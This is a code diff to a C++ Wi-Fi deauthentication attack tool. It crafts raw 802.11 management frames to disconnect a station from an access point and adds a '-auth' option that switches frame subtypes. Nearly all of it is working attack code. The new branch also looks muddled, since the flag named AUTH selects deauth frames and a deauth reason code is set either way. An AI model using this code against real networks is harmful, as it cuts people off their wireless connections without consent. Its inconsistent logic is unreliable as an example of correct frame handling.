@@ -9,6 +9,7 @@
 
 using namespace std;
 bool attack = true;
+bool AUTH = 0;
 
 #pragma pack(push,1)
 struct Deauth_packet{
@@ -24,7 +25,7 @@ struct Deauth_packet{
 #pragma pack(pop)
 
 void usage(){
-    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
+    printf("syntax : deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n");
     printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
     return;
 }
@@ -36,15 +37,17 @@ void sig_handler(int signo){
 }
 
 int main(int argc, char* argv[]){
-    if(argc != 3 && argc != 4){
+    if(argc != 3 && argc != 5){
         usage();
         return 0;
     }
 
     Mac ap = Mac(argv[2]);
     Mac station;
-    if(argc == 4)
+    if(argc == 5){
         station = Mac(argv[3]);
+        AUTH = 1;
+    }
     else
         station = Mac::broadcastMac();
 
@@ -62,23 +65,37 @@ int main(int argc, char* argv[]){
     radio.pad = 0;
     radio.hdr_len = 12;
     radio.present_flag = 0x00008004;
-
+    
     packet.data_rate = 0x02;
     packet.zero = 0x00;
     packet.tx = 0x0018;
-
+    
     Dot11& dot11 = packet.dot11;
     dot11.version = 0;
     dot11.type = 0;
-    dot11.subtype = SUBTYPE_DEAUTH;
+
     dot11.flags = 0;
     dot11.duration = 314;
-    dot11.transmitter = station;
-    dot11.receiver = ap;
-    dot11.bssid = ap;
-    dot11.fragSeqNum = 0x0610;
 
-    packet.reasonCode = DEAUTH_CODE;
+    dot11.fragSeqNum = 0;
+
+    if(AUTH){
+        dot11.subtype = SUBTYPE_DEAUTH;
+        dot11.transmitter = station;
+        dot11.receiver = ap;
+        dot11.bssid = ap;
+
+        packet.reasonCode = DEAUTH_CODE;
+    }
+    else{
+        dot11.subtype = SUBTYPE_AUTH;
+
+        dot11.transmitter = ap;
+        dot11.receiver = station;
+        dot11.bssid = ap;
+
+        packet.reasonCode = DEAUTH_CODE;
+    }
 
     signal(SIGINT,sig_handler);
 
